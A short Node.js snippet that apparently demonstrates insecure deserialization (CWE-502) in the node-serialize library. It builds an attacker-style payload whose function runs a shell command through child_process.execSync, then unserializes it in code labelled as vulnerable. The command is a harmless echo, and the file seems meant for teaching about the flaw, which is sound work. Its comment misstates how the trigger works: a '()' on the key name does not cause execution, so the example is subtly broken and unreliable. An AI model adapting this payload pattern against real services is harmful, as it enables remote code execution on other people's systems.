const serialize = require('node-serialize');

// Simulate a malicious payload from an attacker
// This payload, when deserialized, will execute a command.
const payload = {
  exploit: function() {
    require('child_process').execSync('echo "pwned by insecure deserialization"');
  },
  // The '()' at the end of the key makes the function execute on deserialization
  "exploit()": ""
};

const serializedPayload = serialize.serialize(payload);
console.log("Serialized: ", serializedPayload);

// --- VULNERABLE CODE ---
// Deserializing untrusted data with a vulnerable library
const deserialized = serialize.unserialize(serializedPayload); // CWE-502: Deserialization of Untrusted Data
// -----------------------